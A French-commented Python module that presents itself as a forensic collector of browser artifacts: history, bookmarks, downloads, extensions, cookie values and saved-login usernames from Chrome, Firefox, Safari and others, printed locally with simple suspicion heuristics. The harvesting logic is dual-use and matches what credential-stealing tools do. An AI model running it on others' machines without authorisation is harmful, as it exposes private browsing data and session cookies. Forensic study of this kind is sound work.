#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Collecteur d'artefacts de navigateurs web
Supporte Chrome, Firefox, Edge, Safari, Opera
"""

import os
import sys
import json
import sqlite3
import shutil
import tempfile
from datetime import datetime, timedelta
from pathlib import Path
import base64
import platform

try:
    from Crypto.Cipher import AES
    from Crypto.Protocol.KDF import PBKDF2
    CRYPTO_AVAILABLE = True
except ImportError:
    CRYPTO_AVAILABLE = False

class BrowserCollector:
    """Collecteur d'artefacts de navigateurs web"""
    
    def __init__(self):
        self.system = platform.system()
        self.artifacts = []
        self.browsers_found = []
        
        # Chemins des navigateurs par OS
        self.browser_paths = self._get_browser_paths()
        
    def _get_browser_paths(self):
        """Retourne les chemins des navigateurs selon l'OS"""
        if self.system == "Windows":
            user_profile = os.environ.get('USERPROFILE', '')
            return {
                'Chrome': os.path.join(user_profile, 'AppData', 'Local', 'Google', 'Chrome', 'User Data'),
                'Firefox': os.path.join(user_profile, 'AppData', 'Roaming', 'Mozilla', 'Firefox', 'Profiles'),
                'Edge': os.path.join(user_profile, 'AppData', 'Local', 'Microsoft', 'Edge', 'User Data'),
                'Opera': os.path.join(user_profile, 'AppData', 'Roaming', 'Opera Software', 'Opera Stable'),
                'Brave': os.path.join(user_profile, 'AppData', 'Local', 'BraveSoftware', 'Brave-Browser', 'User Data')
            }
        elif self.system == "Darwin":  # macOS
            home = os.path.expanduser('~')
            return {
                'Chrome': os.path.join(home, 'Library', 'Application Support', 'Google', 'Chrome'),
                'Firefox': os.path.join(home, 'Library', 'Application Support', 'Firefox', 'Profiles'),
                'Safari': os.path.join(home, 'Library', 'Safari'),
                'Edge': os.path.join(home, 'Library', 'Application Support', 'Microsoft Edge'),
                'Opera': os.path.join(home, 'Library', 'Application Support', 'com.operasoftware.Opera')
            }
        else:  # Linux
            home = os.path.expanduser('~')
            return {
                'Chrome': os.path.join(home, '.config', 'google-chrome'),
                'Firefox': os.path.join(home, '.mozilla', 'firefox'),
                'Opera': os.path.join(home, '.config', 'opera'),
                'Chromium': os.path.join(home, '.config', 'chromium')
            }
    
    def collect_all(self):
        """Collecte tous les artefacts de navigateurs"""
        try:
            for browser_name, browser_path in self.browser_paths.items():
                if os.path.exists(browser_path):
                    self.browsers_found.append(browser_name)
                    print(f"[INFO] Collecte des artefacts {browser_name}...")
                    
                    # Collecte selon le type de navigateur
                    if browser_name in ['Chrome', 'Edge', 'Brave', 'Opera']:
                        self._collect_chromium_based(browser_name, browser_path)
                    elif browser_name == 'Firefox':
                        self._collect_firefox(browser_path)
                    elif browser_name == 'Safari':
                        self._collect_safari(browser_path)
            
            return self.artifacts
            
        except Exception as e:
            print(f"[ERREUR] Erreur lors de la collecte navigateurs: {e}")
            return self.artifacts
    
    def _collect_chromium_based(self, browser_name, browser_path):
        """Collecte les artefacts des navigateurs basés sur Chromium"""
        try:
            # Profiles par défaut à vérifier
            profiles = ['Default', 'Profile 1', 'Profile 2', 'Profile 3']
            
            for profile in profiles:
                profile_path = os.path.join(browser_path, profile)
                if os.path.exists(profile_path):
                    print(f"[INFO] Analyse du profil {profile} de {browser_name}")
                    
                    # Historique de navigation
                    self._collect_history_chromium(browser_name, profile_path, profile)
                    
                    # Bookmarks
                    self._collect_bookmarks_chromium(browser_name, profile_path, profile)
                    
                    # Cookies
                    self._collect_cookies_chromium(browser_name, profile_path, profile)
                    
                    # Téléchargements
                    self._collect_downloads_chromium(browser_name, profile_path, profile)
                    
                    # Mots de passe (si accessible)
                    self._collect_passwords_chromium(browser_name, profile_path, profile)
                    
                    # Extensions
                    self._collect_extensions_chromium(browser_name, profile_path, profile)
                    
        except Exception as e:
            print(f"[ERREUR] Erreur collecte {browser_name}: {e}")
    
    def _collect_history_chromium(self, browser, profile_path, profile):
        """Collecte l'historique de navigation Chromium"""
        try:
            history_path = os.path.join(profile_path, 'History')
            if not os.path.exists(history_path):
                return
            
            # Copie temporaire pour éviter les verrous
            temp_path = os.path.join(tempfile.gettempdir(), f'temp_history_{browser}_{profile}.db')
            shutil.copy2(history_path, temp_path)
            
            conn = sqlite3.connect(temp_path)
            cursor = conn.cursor()
            
            # Récupération de l'historique avec détails
            query = """
            SELECT 
                urls.url,
                urls.title,
                urls.visit_count,
                urls.typed_count,
                urls.last_visit_time,
                visits.visit_time,
                visits.transition
            FROM urls 
            LEFT JOIN visits ON urls.id = visits.url
            ORDER BY visits.visit_time DESC
            LIMIT 10000
            """
            
            cursor.execute(query)
            results = cursor.fetchall()
            
            for row in results:
                if row[5]:  # Si visit_time existe
                    # Conversion timestamp Chrome (microsecondes depuis 1601)
                    chrome_time = row[5]
                    if chrome_time > 0:
                        timestamp = datetime(1601, 1, 1) + timedelta(microseconds=chrome_time)
                    else:
                        timestamp = datetime.now()
                    
                    artifact = {
                        'type': 'browser_history',
                        'browser': browser,
                        'profile': profile,
                        'url': row[0] or '',
                        'title': row[1] or '',
                        'visit_count': row[2] or 0,
                        'typed_count': row[3] or 0,
                        'last_visit': timestamp.isoformat(),
                        'transition_type': self._get_transition_type(row[6] or 0),
                        'timestamp': timestamp.isoformat()
                    }
                    self.artifacts.append(artifact)
            
            conn.close()
            os.unlink(temp_path)
            
        except Exception as e:
            print(f"[ERREUR] Erreur historique {browser}: {e}")
    
    def _collect_bookmarks_chromium(self, browser, profile_path, profile):
        """Collecte les bookmarks Chromium"""
        try:
            bookmarks_path = os.path.join(profile_path, 'Bookmarks')
            if not os.path.exists(bookmarks_path):
                return
            
            with open(bookmarks_path, 'r', encoding='utf-8') as f:
                bookmarks_data = json.load(f)
            
            # Parcours récursif des bookmarks
            def parse_bookmarks(folder, path=""):
                if 'children' in folder:
                    for item in folder['children']:
                        current_path = f"{path}/{folder.get('name', '')}" if path else folder.get('name', '')
                        
                        if item.get('type') == 'url':
                            # Conversion timestamp
                            date_added = item.get('date_added', '0')
                            if date_added != '0':
                                timestamp = datetime(1601, 1, 1) + timedelta(microseconds=int(date_added))
                            else:
                                timestamp = datetime.now()
                            
                            artifact = {
                                'type': 'browser_bookmark',
                                'browser': browser,
                                'profile': profile,
                                'name': item.get('name', ''),
                                'url': item.get('url', ''),
                                'folder_path': current_path,
                                'date_added': timestamp.isoformat(),
                                'timestamp': timestamp.isoformat()
                            }
                            self.artifacts.append(artifact)
                        
                        elif item.get('type') == 'folder':
                            parse_bookmarks(item, current_path)
            
            # Parse des différentes sections
            roots = bookmarks_data.get('roots', {})
            for section_name, section_data in roots.items():
                if isinstance(section_data, dict):
                    parse_bookmarks(section_data, section_name)
                    
        except Exception as e:
            print(f"[ERREUR] Erreur bookmarks {browser}: {e}")
    
    def _collect_cookies_chromium(self, browser, profile_path, profile):
        """Collecte les cookies Chromium"""
        try:
            cookies_path = os.path.join(profile_path, 'Cookies')
            if not os.path.exists(cookies_path):
                # Nouveau format Network/Cookies
                cookies_path = os.path.join(profile_path, 'Network', 'Cookies')
                if not os.path.exists(cookies_path):
                    return
            
            temp_path = os.path.join(tempfile.gettempdir(), f'temp_cookies_{browser}_{profile}.db')
            shutil.copy2(cookies_path, temp_path)
            
            conn = sqlite3.connect(temp_path)
            cursor = conn.cursor()
            
            query = """
            SELECT 
                host_key,
                name,
                value,
                path,
                expires_utc,
                is_secure,
                is_httponly,
                creation_utc,
                last_access_utc
            FROM cookies
            ORDER BY last_access_utc DESC
            LIMIT 5000
            """
            
            cursor.execute(query)
            results = cursor.fetchall()
            
            for row in results:
                # Conversion timestamps
                creation_time = self._chrome_time_to_datetime(row[7])
                last_access_time = self._chrome_time_to_datetime(row[8])
                expires_time = self._chrome_time_to_datetime(row[4]) if row[4] > 0 else None
                
                artifact = {
                    'type': 'browser_cookie',
                    'browser': browser,
                    'profile': profile,
                    'host': row[0] or '',
                    'name': row[1] or '',
                    'value': row[2][:100] + '...' if len(row[2] or '') > 100 else row[2] or '',  # Tronqué pour rapport
                    'path': row[3] or '',
                    'expires': expires_time.isoformat() if expires_time else None,
                    'secure': bool(row[5]),
                    'httponly': bool(row[6]),
                    'created': creation_time.isoformat(),
                    'last_access': last_access_time.isoformat(),
                    'timestamp': last_access_time.isoformat()
                }
                self.artifacts.append(artifact)
            
            conn.close()
            os.unlink(temp_path)
            
        except Exception as e:
            print(f"[ERREUR] Erreur cookies {browser}: {e}")
    
    def _collect_downloads_chromium(self, browser, profile_path, profile):
        """Collecte l'historique des téléchargements"""
        try:
            history_path = os.path.join(profile_path, 'History')
            if not os.path.exists(history_path):
                return
            
            temp_path = os.path.join(tempfile.gettempdir(), f'temp_downloads_{browser}_{profile}.db')
            shutil.copy2(history_path, temp_path)
            
            conn = sqlite3.connect(temp_path)
            cursor = conn.cursor()
            
            query = """
            SELECT 
                target_path,
                url,
                start_time,
                end_time,
                received_bytes,
                total_bytes,
                state,
                danger_type,
                interrupt_reason
            FROM downloads
            ORDER BY start_time DESC
            LIMIT 1000
            """
            
            cursor.execute(query)
            results = cursor.fetchall()
            
            for row in results:
                start_time = self._chrome_time_to_datetime(row[2])
                end_time = self._chrome_time_to_datetime(row[3]) if row[3] > 0 else None
                
                artifact = {
                    'type': 'browser_download',
                    'browser': browser,
                    'profile': profile,
                    'file_path': row[0] or '',
                    'url': row[1] or '',
                    'start_time': start_time.isoformat(),
                    'end_time': end_time.isoformat() if end_time else None,
                    'received_bytes': row[4] or 0,
                    'total_bytes': row[5] or 0,
                    'state': self._get_download_state(row[6]),
                    'danger_type': row[7] or 0,
                    'interrupt_reason': row[8] or 0,
                    'timestamp': start_time.isoformat()
                }
                self.artifacts.append(artifact)
            
            conn.close()
            os.unlink(temp_path)
            
        except Exception as e:
            print(f"[ERREUR] Erreur téléchargements {browser}: {e}")
    
    def _collect_passwords_chromium(self, browser, profile_path, profile):
        """Collecte les mots de passe sauvegardés (métadonnées uniquement)"""
        try:
            login_data_path = os.path.join(profile_path, 'Login Data')
            if not os.path.exists(login_data_path):
                return
            
            temp_path = os.path.join(tempfile.gettempdir(), f'temp_passwords_{browser}_{profile}.db')
            shutil.copy2(login_data_path, temp_path)
            
            conn = sqlite3.connect(temp_path)
            cursor = conn.cursor()
            
            query = """
            SELECT 
                origin_url,
                username_value,
                date_created,
                date_last_used,
                times_used
            FROM logins
            ORDER BY date_last_used DESC
            """
            
            cursor.execute(query)
            results = cursor.fetchall()
            
            for row in results:
                created_time = self._chrome_time_to_datetime(row[2])
                last_used_time = self._chrome_time_to_datetime(row[3]) if row[3] > 0 else created_time
                
                artifact = {
                    'type': 'browser_password',
                    'browser': browser,
                    'profile': profile,
                    'origin_url': row[0] or '',
                    'username': row[1] or '',
                    'password': '[CHIFFRÉ - NON EXTRAIT]',  # Pour des raisons de sécurité
                    'date_created': created_time.isoformat(),
                    'date_last_used': last_used_time.isoformat(),
                    'times_used': row[4] or 0,
                    'timestamp': last_used_time.isoformat()
                }
                self.artifacts.append(artifact)
            
            conn.close()
            os.unlink(temp_path)
            
        except Exception as e:
            print(f"[ERREUR] Erreur mots de passe {browser}: {e}")
    
    def _collect_extensions_chromium(self, browser, profile_path, profile):
        """Collecte les extensions installées"""
        try:
            extensions_path = os.path.join(profile_path, 'Extensions')
            if not os.path.exists(extensions_path):
                return
            
            for ext_id in os.listdir(extensions_path):
                ext_folder = os.path.join(extensions_path, ext_id)
                if os.path.isdir(ext_folder):
                    # Cherche le manifest dans les versions
                    for version in os.listdir(ext_folder):
                        version_path = os.path.join(ext_folder, version)
                        manifest_path = os.path.join(version_path, 'manifest.json')
                        
                        if os.path.exists(manifest_path):
                            try:
                                with open(manifest_path, 'r', encoding='utf-8') as f:
                                    manifest = json.load(f)
                                
                                artifact = {
                                    'type': 'browser_extension',
                                    'browser': browser,
                                    'profile': profile,
                                    'extension_id': ext_id,
                                    'name': manifest.get('name', ext_id),
                                    'version': manifest.get('version', version),
                                    'description': manifest.get('description', ''),
                                    'permissions': manifest.get('permissions', []),
                                    'manifest_version': manifest.get('manifest_version', 1),
                                    'timestamp': datetime.now().isoformat()
                                }
                                self.artifacts.append(artifact)
                                break
                                
                            except Exception as e:
                                print(f"[WARN] Erreur lecture manifest {ext_id}: {e}")
                            
        except Exception as e:
            print(f"[ERREUR] Erreur extensions {browser}: {e}")
    
    def _collect_firefox(self, firefox_path):
        """Collecte les artefacts Firefox"""
        try:
            # Trouve les profils Firefox
            profiles_ini = os.path.join(firefox_path, 'profiles.ini')
            if not os.path.exists(profiles_ini):
                return
            
            # Parse profiles.ini pour trouver les profils
            profile_paths = []
            with open(profiles_ini, 'r', encoding='utf-8') as f:
                content = f.read()
                for line in content.split('\n'):
                    if line.startswith('Path='):
                        profile_rel_path = line.split('=', 1)[1]
                        if not os.path.isabs(profile_rel_path):
                            profile_full_path = os.path.join(firefox_path, profile_rel_path)
                        else:
                            profile_full_path = profile_rel_path
                        
                        if os.path.exists(profile_full_path):
                            profile_paths.append(profile_full_path)
            
            # Collecte pour chaque profil
            for i, profile_path in enumerate(profile_paths):
                profile_name = f"Profile_{i}"
                print(f"[INFO] Analyse du profil Firefox {profile_name}")
                
                self._collect_firefox_history(profile_path, profile_name)
                self._collect_firefox_bookmarks(profile_path, profile_name)
                self._collect_firefox_cookies(profile_path, profile_name)
                self._collect_firefox_downloads(profile_path, profile_name)
                
        except Exception as e:
            print(f"[ERREUR] Erreur collecte Firefox: {e}")
    
    def _collect_firefox_history(self, profile_path, profile_name):
        """Collecte l'historique Firefox"""
        try:
            places_path = os.path.join(profile_path, 'places.sqlite')
            if not os.path.exists(places_path):
                return
            
            temp_path = os.path.join(tempfile.gettempdir(), f'temp_ff_places_{profile_name}.db')
            shutil.copy2(places_path, temp_path)
            
            conn = sqlite3.connect(temp_path)
            cursor = conn.cursor()
            
            query = """
            SELECT 
                moz_places.url,
                moz_places.title,
                moz_places.visit_count,
                moz_places.last_visit_date,
                moz_historyvisits.visit_date,
                moz_historyvisits.visit_type
            FROM moz_places
            LEFT JOIN moz_historyvisits ON moz_places.id = moz_historyvisits.place_id
            WHERE moz_historyvisits.visit_date IS NOT NULL
            ORDER BY moz_historyvisits.visit_date DESC
            LIMIT 10000
            """
            
            cursor.execute(query)
            results = cursor.fetchall()
            
            for row in results:
                # Firefox utilise les microsecondes depuis epoch Unix
                if row[4]:
                    timestamp = datetime.fromtimestamp(row[4] / 1000000)
                else:
                    timestamp = datetime.now()
                
                artifact = {
                    'type': 'browser_history',
                    'browser': 'Firefox',
                    'profile': profile_name,
                    'url': row[0] or '',
                    'title': row[1] or '',
                    'visit_count': row[2] or 0,
                    'last_visit': timestamp.isoformat(),
                    'visit_type': row[5] or 0,
                    'timestamp': timestamp.isoformat()
                }
                self.artifacts.append(artifact)
            
            conn.close()
            os.unlink(temp_path)
            
        except Exception as e:
            print(f"[ERREUR] Erreur historique Firefox: {e}")
    
    def _collect_firefox_bookmarks(self, profile_path, profile_name):
        """Collecte les bookmarks Firefox"""
        try:
            places_path = os.path.join(profile_path, 'places.sqlite')
            if not os.path.exists(places_path):
                return
            
            temp_path = os.path.join(tempfile.gettempdir(), f'temp_ff_bookmarks_{profile_name}.db')
            shutil.copy2(places_path, temp_path)
            
            conn = sqlite3.connect(temp_path)
            cursor = conn.cursor()
            
            query = """
            SELECT 
                moz_bookmarks.title,
                moz_places.url,
                moz_bookmarks.dateAdded,
                moz_bookmarks.lastModified,
                moz_bookmarks.type
            FROM moz_bookmarks
            LEFT JOIN moz_places ON moz_bookmarks.fk = moz_places.id
            WHERE moz_bookmarks.type = 1 AND moz_places.url IS NOT NULL
            ORDER BY moz_bookmarks.dateAdded DESC
            """
            
            cursor.execute(query)
            results = cursor.fetchall()
            
            for row in results:
                date_added = datetime.fromtimestamp(row[2] / 1000000) if row[2] else datetime.now()
                
                artifact = {
                    'type': 'browser_bookmark',
                    'browser': 'Firefox',
                    'profile': profile_name,
                    'name': row[0] or '',
                    'url': row[1] or '',
                    'date_added': date_added.isoformat(),
                    'timestamp': date_added.isoformat()
                }
                self.artifacts.append(artifact)
            
            conn.close()
            os.unlink(temp_path)
            
        except Exception as e:
            print(f"[ERREUR] Erreur bookmarks Firefox: {e}")
    
    def _collect_firefox_cookies(self, profile_path, profile_name):
        """Collecte les cookies Firefox"""
        try:
            cookies_path = os.path.join(profile_path, 'cookies.sqlite')
            if not os.path.exists(cookies_path):
                return
            
            temp_path = os.path.join(tempfile.gettempdir(), f'temp_ff_cookies_{profile_name}.db')
            shutil.copy2(cookies_path, temp_path)
            
            conn = sqlite3.connect(temp_path)
            cursor = conn.cursor()
            
            query = """
            SELECT 
                host,
                name,
                value,
                path,
                expiry,
                isSecure,
                isHttpOnly,
                creationTime,
                lastAccessed
            FROM moz_cookies
            ORDER BY lastAccessed DESC
            LIMIT 5000
            """
            
            cursor.execute(query)
            results = cursor.fetchall()
            
            for row in results:
                creation_time = datetime.fromtimestamp(row[7] / 1000000) if row[7] else datetime.now()
                last_access = datetime.fromtimestamp(row[8] / 1000000) if row[8] else creation_time
                expires = datetime.fromtimestamp(row[4]) if row[4] and row[4] > 0 else None
                
                artifact = {
                    'type': 'browser_cookie',
                    'browser': 'Firefox',
                    'profile': profile_name,
                    'host': row[0] or '',
                    'name': row[1] or '',
                    'value': row[2][:100] + '...' if len(row[2] or '') > 100 else row[2] or '',
                    'path': row[3] or '',
                    'expires': expires.isoformat() if expires else None,
                    'secure': bool(row[5]),
                    'httponly': bool(row[6]),
                    'created': creation_time.isoformat(),
                    'last_access': last_access.isoformat(),
                    'timestamp': last_access.isoformat()
                }
                self.artifacts.append(artifact)
            
            conn.close()
            os.unlink(temp_path)
            
        except Exception as e:
            print(f"[ERREUR] Erreur cookies Firefox: {e}")
    
    def _collect_firefox_downloads(self, profile_path, profile_name):
        """Collecte les téléchargements Firefox"""
        try:
            places_path = os.path.join(profile_path, 'places.sqlite')
            if not os.path.exists(places_path):
                return
            
            temp_path = os.path.join(tempfile.gettempdir(), f'temp_ff_downloads_{profile_name}.db')
            shutil.copy2(places_path, temp_path)
            
            conn = sqlite3.connect(temp_path)
            cursor = conn.cursor()
            
            # Firefox stocke aussi dans downloads.sqlite
            downloads_path = os.path.join(profile_path, 'downloads.sqlite')
            if os.path.exists(downloads_path):
                temp_dl_path = os.path.join(tempfile.gettempdir(), f'temp_ff_dl_{profile_name}.db')
                shutil.copy2(downloads_path, temp_dl_path)
                
                dl_conn = sqlite3.connect(temp_dl_path)
                dl_cursor = dl_conn.cursor()
                
                query = """
                SELECT 
                    target,
                    source,
                    startTime,
                    endTime,
                    state,
                    maxBytes,
                    currBytes
                FROM moz_downloads
                ORDER BY startTime DESC
                """
                
                dl_cursor.execute(query)
                results = dl_cursor.fetchall()
                
                for row in results:
                    start_time = datetime.fromtimestamp(row[2] / 1000000) if row[2] else datetime.now()
                    end_time = datetime.fromtimestamp(row[3] / 1000000) if row[3] else None
                    
                    artifact = {
                        'type': 'browser_download',
                        'browser': 'Firefox',
                        'profile': profile_name,
                        'file_path': row[0] or '',
                        'url': row[1] or '',
                        'start_time': start_time.isoformat(),
                        'end_time': end_time.isoformat() if end_time else None,
                        'state': row[4] or 0,
                        'total_bytes': row[5] or 0,
                        'received_bytes': row[6] or 0,
                        'timestamp': start_time.isoformat()
                    }
                    self.artifacts.append(artifact)
                
                dl_conn.close()
                os.unlink(temp_dl_path)
            
            conn.close()
            os.unlink(temp_path)
            
        except Exception as e:
            print(f"[ERREUR] Erreur téléchargements Firefox: {e}")
    
    def _collect_safari(self, safari_path):
        """Collecte les artefacts Safari (macOS)"""
        try:
            # Historique Safari
            history_path = os.path.join(safari_path, 'History.db')
            if os.path.exists(history_path):
                self._collect_safari_history(history_path)
            
            # Bookmarks Safari
            bookmarks_path = os.path.join(safari_path, 'Bookmarks.plist')
            if os.path.exists(bookmarks_path):
                self._collect_safari_bookmarks(bookmarks_path)
                
        except Exception as e:
            print(f"[ERREUR] Erreur collecte Safari: {e}")
    
    def _collect_safari_history(self, history_path):
        """Collecte l'historique Safari"""
        try:
            temp_path = os.path.join(tempfile.gettempdir(), 'temp_safari_history.db')
            shutil.copy2(history_path, temp_path)
            
            conn = sqlite3.connect(temp_path)
            cursor = conn.cursor()
            
            query = """
            SELECT 
                url,
                title,
                visit_count,
                visit_time
            FROM history_visits
            ORDER BY visit_time DESC
            LIMIT 10000
            """
            
            cursor.execute(query)
            results = cursor.fetchall()
            
            for row in results:
                visit_time = datetime.fromtimestamp(row[3] + 978307200) if row[3] else datetime.now()  # Safari epoch
                
                artifact = {
                    'type': 'browser_history',
                    'browser': 'Safari',
                    'profile': 'Default',
                    'url': row[0] or '',
                    'title': row[1] or '',
                    'visit_count': row[2] or 0,
                    'timestamp': visit_time.isoformat()
                }
                self.artifacts.append(artifact)
            
            conn.close()
            os.unlink(temp_path)
            
        except Exception as e:
            print(f"[ERREUR] Erreur historique Safari: {e}")
    
    def _collect_safari_bookmarks(self, bookmarks_path):
        """Collecte les bookmarks Safari"""
        try:
            # Safari utilise des plists, nécessite plistlib
            import plistlib
            
            with open(bookmarks_path, 'rb') as f:
                bookmarks_data = plistlib.load(f)
            
            def parse_safari_bookmarks(items, folder_path=""):
                for item in items:
                    if item.get('WebBookmarkType') == 'WebBookmarkTypeLeaf':
                        # C'est un bookmark
                        artifact = {
                            'type': 'browser_bookmark',
                            'browser': 'Safari',
                            'profile': 'Default',
                            'name': item.get('URIDictionary', {}).get('title', ''),
                            'url': item.get('URLString', ''),
                            'folder_path': folder_path,
                            'timestamp': datetime.now().isoformat()
                        }
                        self.artifacts.append(artifact)
                    
                    elif item.get('WebBookmarkType') == 'WebBookmarkTypeList':
                        # C'est un dossier
                        folder_name = item.get('Title', '')
                        new_path = f"{folder_path}/{folder_name}" if folder_path else folder_name
                        children = item.get('Children', [])
                        parse_safari_bookmarks(children, new_path)
            
            # Parse des bookmarks
            children = bookmarks_data.get('Children', [])
            parse_safari_bookmarks(children)
            
        except Exception as e:
            print(f"[ERREUR] Erreur bookmarks Safari: {e}")
    
    # Méthodes utilitaires
    def _chrome_time_to_datetime(self, chrome_time):
        """Convertit un timestamp Chrome en datetime"""
        try:
            if chrome_time > 0:
                return datetime(1601, 1, 1) + timedelta(microseconds=chrome_time)
            return datetime.now()
        except:
            return datetime.now()
    
    def _get_transition_type(self, transition_code):
        """Convertit le code de transition en texte lisible"""
        transitions = {
            0: 'LINK',
            1: 'TYPED',
            2: 'AUTO_BOOKMARK',
            3: 'AUTO_SUBFRAME',
            4: 'MANUAL_SUBFRAME',
            5: 'GENERATED',
            6: 'AUTO_TOPLEVEL',
            7: 'FORM_SUBMIT',
            8: 'RELOAD',
            9: 'KEYWORD',
            10: 'KEYWORD_GENERATED'
        }
        return transitions.get(transition_code & 0xFF, f'UNKNOWN_{transition_code}')
    
    def _get_download_state(self, state_code):
        """Convertit le code d'état de téléchargement"""
        states = {
            0: 'IN_PROGRESS',
            1: 'COMPLETE',
            2: 'CANCELLED',
            3: 'INTERRUPTED'
        }
        return states.get(state_code, f'UNKNOWN_{state_code}')
    
    def get_summary(self):
        """Retourne un résumé de la collecte"""
        summary = {
            'browsers_found': len(self.browsers_found),
            'browsers_list': self.browsers_found,
            'total_artifacts': len(self.artifacts),
            'artifacts_by_type': {}
        }
        
        # Comptage par type
        for artifact in self.artifacts:
            artifact_type = artifact.get('type', 'unknown')
            summary['artifacts_by_type'][artifact_type] = summary['artifacts_by_type'].get(artifact_type, 0) + 1
        
        return summary
    
    def get_recommendations(self):
        """Génère des recommandations forensiques"""
        recommendations = []
        
        # Analyse des patterns suspects
        history_count = len([a for a in self.artifacts if a.get('type') == 'browser_history'])
        if history_count > 5000:
            recommendations.append("⚠️ Volume d'historique très élevé - Vérifier les activités inhabituelles")
        
        # Analyse des téléchargements
        downloads = [a for a in self.artifacts if a.get('type') == 'browser_download']
        suspicious_extensions = ['.exe', '.bat', '.scr', '.com', '.pif', '.vbs']
        
        for download in downloads:
            file_path = download.get('file_path', '').lower()
            if any(ext in file_path for ext in suspicious_extensions):
                recommendations.append(f"🚨 Téléchargement suspect détecté: {download.get('file_path', '')}")
        
        # Analyse des extensions
        extensions = [a for a in self.artifacts if a.get('type') == 'browser_extension']
        if len(extensions) > 20:
            recommendations.append("⚠️ Nombre d'extensions élevé - Vérifier les extensions malveillantes")
        
        # Analyse temporelle
        recent_activity = []
        now = datetime.now()
        for artifact in self.artifacts:
            try:
                timestamp = datetime.fromisoformat(artifact.get('timestamp', ''))
                if (now - timestamp).days < 1:
                    recent_activity.append(artifact)
            except:
                pass
        
        if len(recent_activity) > 1000:
            recommendations.append("📊 Activité récente très élevée - Analyser les dernières 24h")
        
        return recommendations

# Fonction principale pour tests
if __name__ == "__main__":
    print("🌍 Démarrage de la collecte d'artefacts navigateurs...")
    
    collector = BrowserCollector()
    artifacts = collector.collect_all()
    
    print(f"\n📊 Collecte terminée:")
    print(f"   • Navigateurs trouvés: {len(collector.browsers_found)}")
    print(f"   • Artefacts collectés: {len(artifacts)}")
    
    summary = collector.get_summary()
    print(f"\n📈 Résumé par type:")
    for artifact_type, count in summary['artifacts_by_type'].items():
        print(f"   • {artifact_type}: {count}")
    
    recommendations = collector.get_recommendations()
    if recommendations:
        print(f"\n🔍 Recommandations:")
        for rec in recommendations:
            print(f"   {rec}")
    
    print(f"\n✅ Collecte navigateurs terminée avec succès!")